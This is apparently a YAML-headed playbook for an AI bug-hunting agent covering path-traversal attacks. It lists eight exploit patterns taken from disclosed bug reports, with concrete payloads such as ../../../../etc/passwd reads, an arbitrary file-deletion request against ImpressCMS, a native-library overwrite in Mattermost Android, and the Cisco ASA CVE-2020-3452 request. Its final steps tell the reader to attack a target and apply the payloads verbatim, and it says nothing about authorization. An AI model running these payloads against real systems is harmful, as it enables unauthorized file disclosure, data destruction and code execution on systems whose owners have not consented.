---
name: hunter-l4-path-traversal
description: "Test for path traversal / arbitrary file read with real payloads."
domain: cybersecurity
subdomain: web
tags:
- web
- path-traversal
- hunting
- l4
version: '1.0'
---
# L4 Playbook: Path Traversal (hunter)

**L3 technique sheet:** `knowledge/sheets/path-traversal.md` — (pending L3 synthesis)

## When to use
Attack a target surface for Path Traversal. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 1007799 [ajaysenr]
- endpoint: `POST /{path}/register/RegisterUserInfo.htm`
- parameter: `registerUserInfoCommand.nextPageName`
- payload: `registerUserInfoCommand.organization=Chantest+Corporation&registerUserInfoCommand.organizationId=49800&registerUserInfoCommand.currPageName=SearchUserOrgInfo.jsp&registerUserInfoCommand.nextPageName=.`
- root cause: The nextPageName parameter is used to build a server-side file path without whitelisting or sanitizing path traversal characters.
- impact: Read local files on the server including /WEB-INF/web.xml, /WEB-INF/app-config.xml, and /WEB-INF/spring/explicit-security-config.xml (application sour

### 1081878 [ajaysenr]
- endpoint: `GET /libraries/image-editor/image-edit.php`
- parameter: `op, image_id, image_temp`
- payload: `http://[impresscms]/libraries/image-editor/image-edit.php?op=save&image_id=1&image_temp=../../../mainfile.php`
- root cause: the image_temp parameter is passed unsanitized to unlink(), enabling path traversal to delete arbitrary files
- impact: authenticated attacker deleted mainfile.php, rendering the website unusable; arbitrary file deletion leading to DoS or destruction of user data (delet

### 1115864 [ajaysenr]
- endpoint: `com.mattermost.share.ShareActivity (content:// URI, RealPathUtil)`
- parameter: `_display_name`
- payload: `../../lib-main/libyoga.so`
- root cause: ShareActivity saved the shared file using the unsanitized _display_name from the content provider, enabling path traversal out of the cache directory
- impact: Overwrote lib-main/libyoga.so with a malicious library that executes on the next app launch — persistent arbitrary code execution in the Mattermost An

### 1131465 [ajaysenr]
- endpoint: `Tempfile.open() (Ruby stdlib)`
- parameter: `basename, ext`
- payload: `Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])`
- root cause: On Windows, backslashes in Tempfile basename/ext are unsanitized, allowing path traversal out of the temp directory.
- impact: Created file malicious20210321-22472-fvuodx.rb under C:\Users\rootx (outside the temp dir) via path traversal; arbitrary file creation, potentially RC

### 1137321 [ajaysenr]
- endpoint: `GET /+CSCOT+/translation-table`
- parameter: `lang`
- payload: `https://█████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../`
- root cause: The Cisco ASA translation-table endpoint reflects the lang parameter into a file path without validation (CVE-2020-3452).
- impact: Path traversal confirmed on the target host via lang=../; CVE-2020-3452 permits arbitrary file read on the ASA device.

### 113831 [ajaysenr]
- endpoint: `GET /render (render params[:id])`
- parameter: `id`
- payload: `render params[:id]`
- root cause: Action View render() passed unverified user input as a template path, allowing directory traversal outside the view directory (CVE-2016-0752 / CVE-201
- impact: Crafted requests rendered files from outside the view directory, an information leak potentially escalating to remote code execution.

### 118688 [ajaysenr]
- endpoint: `GET /cube.csv`
- parameter: `timezone`
- payload: `timezone=../../../etc/`
- root cause: The timezone parameter is resolved against the server filesystem without validation, leaking path existence through error messages.
- impact: Enumerated server paths: '../../../etc/' returned 'is a directory'; variations on /etc/passwd confirmed existence and leaked the on-disk zoneinfo.zip 

### 122475 [ajaysenr]
- endpoint: `POST /edit/process`
- parameter: `file path`
- payload: `../../../../etc/passwd`
- root cause: The /edit/process API allowed file paths to traverse up outside their intended directory.
- impact: Performed a local file read by traversing outside the intended directory via the image editor API.

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

